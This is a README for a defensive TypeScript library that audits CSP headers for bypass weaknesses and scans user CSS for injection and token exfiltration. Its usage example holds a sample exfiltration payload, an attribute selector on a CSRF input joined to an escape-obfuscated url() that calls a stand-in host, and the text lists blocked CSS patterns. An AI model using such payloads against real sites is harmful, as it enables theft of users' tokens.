# CSP Level 3 Evaluator & CSS Injection Auditor

Zero-dependency, importable TypeScript components for a web-application security
gateway. They audit response `Content-Security-Policy` headers and
user-controlled style fragments before release, covering the bypass classes that
a naive "does a `script-src` directive exist" check misses:

- directive fallback through `default-src`;
- `'strict-dynamic'` overriding classic host/scheme allowlists and
  `'unsafe-inline'`;
- missing `base-uri` / `object-src` enabling `<base>` relative-script hijacking;
- CSS token exfiltration via attribute selectors joined to external `url()`.

The package has **no runtime dependencies** and runs on any ES2022 host with a
WebCrypto `subtle` implementation (browsers and Node 16+).

## Layout

| File | Responsibility |
| --- | --- |
| `src/csp.ts` | CSP Level 3 parser, directive fallback, intersection, nonce/hash evaluation and bypass auditing. |
| `src/css.ts` | Zero-dependency CSS normalizer/tokenizer/parser and injection/exfiltration auditor. |
| `src/index.ts` | Barrel export for the public API. |
| `test/*.test.ts` | Adversarial test suites run with the built-in Node test runner. |

## CSP Level 3 component (`src/csp.ts`)

### Parsing & enforcement model

- `parsePolicy` / `parsePolicies` parse one or more header values.
- Duplicate directives inside one header keep only the first occurrence
  (`DUPLICATE_DIRECTIVE`); later ones are recorded but never enforced.
- `resolveDirective` applies CSP3 fallback chains
  (`script-src-elem` → `script-src` → `default-src`, `object-src` →
  `default-src`, ...). `base-uri`, `form-action` and `frame-ancestors` have no
  fallback by spec.
- `resolveScriptSources` implements `'strict-dynamic'`: host, scheme and
  wildcard sources are always ignored while it is present; `'unsafe-inline'` is
  additionally ignored once a nonce/hash trusted root exists. Nonces, hashes and
  `'unsafe-eval'` remain effective.
- `intersectPolicies` builds the strictest intersection: browsers enforce every
  CSP header simultaneously (logical AND), so a source is effective only when
  every policy contains it and a directive missing from any policy is dropped.

### Bypass findings

`auditCsp(headers, options?)` returns `{ policies, findings, merged }`. Finding
codes include `UNSAFE_INLINE`, `UNSAFE_EVAL`, `WILDCARD_SCRIPT`,
`BROAD_SCHEME_SCRIPT`, `DATA_SCRIPT`, `JSONP_OR_REDIRECT_SOURCE`,
`MISSING_OBJECT_SRC`, `OBJECT_SRC_UNSAFE`, `MISSING_BASE_URI`,
`BASE_URI_UNSAFE`, `STRICT_DYNAMIC_WITHOUT_NONCE_OR_HASH` and
`MISSING_DEFAULT_OR_SCRIPT_SRC`. Known JSONP / open-redirect hosts live in
`KNOWN_RISKY_HOSTS` and can be extended with `extraRiskyHosts`.

### Runtime evaluation

- `evaluateInlineScript(policies, sourceText, nonce?)` checks nonces then
  `sha256` / `sha384` / `sha512` hashes across every enforced policy (async,
  WebCrypto).
- `evaluateExternalScript(policies, url)` /
  `evaluateExternalScriptForPolicy(policy, url)` evaluate host/scheme/`*`/
  `'self'` sources and honor the `'strict-dynamic'` allowlist override.

```ts
import { auditCsp, evaluateInlineScript } from './src/index.ts';

const result = auditCsp([
  "script-src 'nonce-a' 'strict-dynamic'; object-src 'none'; base-uri 'none'",
  "script-src 'unsafe-inline'; object-src 'none'; base-uri 'none'",
]);
result.findings; // flags UNSAFE_INLINE on the weak second header
```

## CSS auditor (`src/css.ts`)

`auditCss(css, options?)` runs two complementary layers and returns
`{ allowed, findings, normalized }`.

1. **Obfuscation-resistant normalized scan** — `normalizeCss` strips comments,
   removes backslash-newline line continuations and decodes CSS escape
   sequences (`\75 rl(`, `\000075rl(`, comment-split and newline-split
   payloads), keeping an offset map back to the original source. This layer
   hard-blocks `@import`, `expression()`, `-moz-binding`, executable schemes
   (`javascript:`/`vbscript:`), and external `url()` hosts outside
   `allowedHosts` (`EXTERNAL_URL`, `DANGEROUS_SCHEME`, `DATA_URL_BLOCKED`).
2. **Structural tokenizer/parser analysis** — a hand-written CSS Syntax 3 style
   tokenizer plus recursive-descent parser recovers selectors, declarations and
   nested at-rules. It correlates sensitive attribute selectors
   (`[value^=...]`, `[name*=token]`, ...) with external `url()` or
   `@font-face` loads, emitting `ATTRIBUTE_EXFIL` / `FONT_FACE_EXFIL`.

Relative and root-relative URLs are treated as same-origin and allowed;
`data:`/`blob:`/`about:` are non-network schemes (`data:` can be blocked with
`blockDataUrls: true`). Host allowlist entries match the apex or, when prefixed
with `.`, the domain and any sub-domain.

```ts
import { auditCss } from './src/index.ts';

const verdict = auditCss(
  'input[name*="csrf"][value^="a"] { background: \\75 rl("https://evil.test/x"); }',
  { allowedHosts: ['cdn.example.com'] },
);
verdict.allowed; // false
verdict.findings.map((f) => f.code); // ['EXTERNAL_URL', 'ATTRIBUTE_EXFIL']
```

## Tests

```sh
npm test
```

The suites use the built-in Node test runner with native TypeScript type
stripping (no install step). They include the requested adversarial cases:
multi-header intersection, duplicate-directive ignoring, `<base>` hijack
exposure, `'strict-dynamic'` semantics, and Unicode-escaped / comment-split
CSS `url()` exfiltration.
